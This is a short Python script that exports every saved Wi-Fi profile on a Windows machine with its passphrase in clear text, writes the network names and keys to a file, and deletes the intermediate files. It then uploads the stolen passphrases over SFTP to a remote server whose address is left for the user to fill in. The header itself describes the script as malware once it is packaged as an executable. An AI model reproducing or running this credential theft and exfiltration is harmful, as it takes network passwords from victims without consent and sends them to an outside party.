#Export WLAN profiles from a windows machine, with passphrase
#__author__ = "Ed Tredgett - edtredgett@gmail.com"
print """
Quick script to export all wireless profiles from a windows box.
Written by Ed Tredgett - edtredgett@gmail.com Twitter-@edtredgett

If you use pyinstaller or py2exe to create an exe of this script, it turns into a nice little piece of malware.......

"""
import subprocess
import os
import paramiko

def export_profiles():
	command = 'netsh wlan export profile key=clear'
	p = subprocess.Popen(command, shell=False,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	stdout,stderr = p.communicate()
	e = subprocess.Popen('type WiFi* > Exported_WiFi_Profiles.xml',shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	stdout,stderr = e.communicate()
	delete = subprocess.Popen('del WiFi*',shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	stdout,stderr = delete.communicate()
	print "All Wlan profiles exported to: WiFi_Profile_Passphrases.txt"
	output()

def output():
	fdesc = open('Exported_WiFi_Profiles.xml','r')
	new_file = open('WiFi_Profile_Passphrases.txt', 'w')
	ssid = []
	password = []
	for line in fdesc.readlines():
		if "<name>" in line:
			ap = line.split('<name>')
			if ap[1][:-8] not in ssid:
				ssid.append(ap[1][:-8])
			else:
				pass
		elif "<keyMaterial>" in line:
			key = line.split('<keyMaterial>')
			if key[1][:-15] not in password:
				password.append(key[1][:-15])
			else:
				pass
		else:
			pass
	for s,p in zip(ssid,password):
		new_file.write("AP: " + '"'+s + '" Passphrase: "' + p + '"\n')
	fdesc.close()
	new_file.close()
	delete = subprocess.Popen('del Exported_WiFi_Profiles.xml',shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	stdout,stderr = delete.communicate()
	scp_to_server()
	
def scp_to_server():
	ssh = paramiko.SSHClient()
	working_directory = subprocess.Popen('echo %cd%',shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	stdout,stderr = working_directory.communicate()
	get_username = subprocess.Popen('echo %username%',shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	out,err = get_username.communicate()
	print str(out.strip('\n').strip('\r'))+'WiFi'
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#       Edit this line with your server details to upload the passphrases to your server
	ssh.connect('#', port=22, username='#',password='#')
	sftp = ssh.open_sftp()
	location = str(stdout.strip('\n').strip('\r'))+ "\WiFi_Profile_Passphrases.txt"
	sftp.put(location,'public_html/'+str(out.strip('\n').strip('\r'))+'-WiFi_Profile_Passphrases.txt')
	sftp.close()
	ssh.close()
	print "\nPut file containing %s WLAN passphrases to your server"%out.strip('\n').strip('\r')
	
if __name__ == "__main__":
    export_profiles()
